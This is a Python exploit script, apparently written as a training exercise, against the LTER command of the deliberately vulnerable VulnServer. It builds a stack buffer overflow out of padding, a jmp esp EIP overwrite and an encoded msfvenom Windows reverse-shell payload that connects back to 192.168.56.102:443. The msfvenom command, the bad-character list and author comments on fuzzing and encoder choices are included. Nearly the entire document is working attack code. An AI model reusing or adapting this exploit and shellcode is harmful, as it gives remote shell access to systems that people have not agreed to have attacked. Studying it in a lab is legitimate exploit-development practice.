#!/usr/bin/env python
#VulnServer LTER Exploit
#Author: @HackerOnTwoWheels
import socket
import struct

#Lessons learned: 
#Just because 5000 bytes crashed and overwrote seh, it does not mean it's the best BoF, in this case 3000 was a much better BoF for a direct EIP overwrite
#So fuzzing needs to start low and go high
#Instead of spike maybe fuzz with python increase every 1k 
#For x86/alpha_mixed encoder, check if one of the registers holds the current possition of the start of the shellcode, if so use the option BufferRegister= in the msfvenom command
#this case ESP held our true position, since we used "jmp esp" to jump to the beginning of shellcode. 

#Target
host="192.168.56.101"
port=9999

#Connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	connect = s.connect((host,port))
	print "\n[*] Successfully connected to VulnServer at: " + host + " [*]"
except:
	print "\n[!]Vulnserver cannot be reached at: " + host + " [!]"
	print "\n[!]Please check if vulnserver is running on target host [!]"


#Payload

badchars = ("\x1c\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffsize = 3000
header = "LTER /../"
padding = "A" * 2003
eip = "\x05\x12\x50\x62" # 0x62501205  jump esp

#msfvenom  -a x86 --platform windows -p windows/shell_reverse_tcp lhost=192.168.56.102 lport=443 -b "\x1c\x00" -e x86/alpha_mixed BufferRegister=ESP -f python
buf =  ""
buf += "\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += "\x69\x6c\x38\x68\x6c\x42\x37\x70\x37\x70\x57\x70\x71"
buf += "\x70\x6d\x59\x4d\x35\x54\x71\x49\x50\x73\x54\x4c\x4b"
buf += "\x76\x30\x54\x70\x6c\x4b\x46\x32\x74\x4c\x6c\x4b\x52"
buf += "\x72\x62\x34\x4e\x6b\x33\x42\x54\x68\x44\x4f\x6c\x77"
buf += "\x62\x6a\x44\x66\x74\x71\x69\x6f\x6e\x4c\x75\x6c\x53"
buf += "\x51\x61\x6c\x46\x62\x44\x6c\x35\x70\x4a\x61\x48\x4f"
buf += "\x34\x4d\x66\x61\x39\x57\x78\x62\x7a\x52\x32\x72\x30"
buf += "\x57\x4c\x4b\x61\x42\x32\x30\x4e\x6b\x62\x6a\x65\x6c"
buf += "\x6e\x6b\x42\x6c\x57\x61\x33\x48\x39\x73\x73\x78\x53"
buf += "\x31\x68\x51\x50\x51\x4e\x6b\x72\x79\x55\x70\x37\x71"
buf += "\x5a\x73\x6e\x6b\x61\x59\x47\x68\x5a\x43\x66\x5a\x62"
buf += "\x69\x4e\x6b\x56\x54\x4c\x4b\x56\x61\x78\x56\x75\x61"
buf += "\x69\x6f\x4c\x6c\x5a\x61\x68\x4f\x44\x4d\x47\x71\x6a"
buf += "\x67\x75\x68\x59\x70\x31\x65\x4c\x36\x53\x33\x51\x6d"
buf += "\x68\x78\x67\x4b\x71\x6d\x54\x64\x50\x75\x48\x64\x50"
buf += "\x58\x4c\x4b\x51\x48\x65\x74\x76\x61\x79\x43\x31\x76"
buf += "\x4e\x6b\x34\x4c\x32\x6b\x6e\x6b\x43\x68\x47\x6c\x55"
buf += "\x51\x59\x43\x4e\x6b\x65\x54\x6e\x6b\x76\x61\x38\x50"
buf += "\x4d\x59\x33\x74\x64\x64\x67\x54\x73\x6b\x33\x6b\x33"
buf += "\x51\x43\x69\x52\x7a\x63\x61\x6b\x4f\x6d\x30\x61\x4f"
buf += "\x31\x4f\x42\x7a\x4c\x4b\x56\x72\x38\x6b\x4c\x4d\x73"
buf += "\x6d\x65\x38\x66\x53\x64\x72\x73\x30\x43\x30\x51\x78"
buf += "\x64\x37\x51\x63\x75\x62\x31\x4f\x76\x34\x65\x38\x32"
buf += "\x6c\x34\x37\x37\x56\x73\x37\x59\x6f\x48\x55\x6d\x68"
buf += "\x4e\x70\x53\x31\x55\x50\x33\x30\x76\x49\x78\x44\x43"
buf += "\x64\x56\x30\x30\x68\x71\x39\x6b\x30\x70\x6b\x45\x50"
buf += "\x79\x6f\x49\x45\x32\x70\x36\x30\x76\x30\x36\x30\x37"
buf += "\x30\x30\x50\x61\x50\x30\x50\x65\x38\x5a\x4a\x56\x6f"
buf += "\x69\x4f\x39\x70\x59\x6f\x6a\x75\x6e\x77\x31\x7a\x54"
buf += "\x45\x35\x38\x79\x50\x39\x38\x36\x58\x61\x76\x32\x48"
buf += "\x43\x32\x37\x70\x65\x51\x4d\x6b\x6d\x59\x59\x76\x42"
buf += "\x4a\x46\x70\x36\x36\x51\x47\x52\x48\x6d\x49\x79\x35"
buf += "\x74\x34\x65\x31\x6b\x4f\x6e\x35\x4b\x35\x4b\x70\x72"
buf += "\x54\x56\x6c\x69\x6f\x62\x6e\x54\x48\x42\x55\x4a\x4c"
buf += "\x63\x58\x78\x70\x58\x35\x79\x32\x52\x76\x4b\x4f\x5a"
buf += "\x75\x45\x38\x30\x63\x42\x4d\x51\x74\x53\x30\x4d\x59"
buf += "\x68\x63\x76\x37\x73\x67\x51\x47\x35\x61\x78\x76\x62"
buf += "\x4a\x37\x62\x73\x69\x73\x66\x7a\x42\x4b\x4d\x43\x56"
buf += "\x7a\x67\x31\x54\x74\x64\x35\x6c\x77\x71\x35\x51\x6c"
buf += "\x4d\x53\x74\x75\x74\x34\x50\x4f\x36\x63\x30\x63\x74"
buf += "\x50\x54\x72\x70\x66\x36\x42\x76\x50\x56\x73\x76\x73"
buf += "\x66\x30\x4e\x32\x76\x70\x56\x46\x33\x32\x76\x35\x38"
buf += "\x62\x59\x68\x4c\x45\x6f\x4b\x36\x49\x6f\x38\x55\x4d"
buf += "\x59\x4b\x50\x70\x4e\x30\x56\x31\x56\x79\x6f\x50\x30"
buf += "\x65\x38\x66\x68\x6c\x47\x37\x6d\x53\x50\x4b\x4f\x48"
buf += "\x55\x6f\x4b\x38\x70\x78\x35\x4c\x62\x30\x56\x32\x48"
buf += "\x39\x36\x5a\x35\x4d\x6d\x6d\x4d\x6b\x4f\x69\x45\x35"
buf += "\x6c\x64\x46\x71\x6c\x45\x5a\x6d\x50\x4b\x4b\x6d\x30"
buf += "\x50\x75\x66\x65\x4d\x6b\x62\x67\x75\x43\x42\x52\x72"
buf += "\x4f\x32\x4a\x55\x50\x50\x53\x79\x6f\x48\x55\x41\x41"



payload = header + padding + eip +buf
payload += "C" * (buffsize - len(payload))

#Send Payload and Exploit
count = 0
print "\n[*] Sending Payload to target [*]\n"
s.send(payload)
#while True:
#	count += 1
#	s.send(payload)
#	print "[*] Sent: " + str(len(payload)) + " bytes " + str(count) + " times[*]\n"
s.close()

